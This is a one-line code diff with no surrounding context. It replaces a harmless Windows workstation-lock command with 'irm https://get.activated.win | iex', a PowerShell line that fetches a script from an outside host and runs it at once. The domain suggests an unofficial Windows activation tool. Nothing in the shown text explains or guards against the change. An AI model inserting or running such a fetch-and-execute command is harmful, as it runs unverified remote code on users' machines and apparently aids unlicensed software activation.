@@ -1,1 +1,1 @@
-'''rundll32.exe user32.dll,lockWorkStation'''
+irm https://get.activated.win | iex
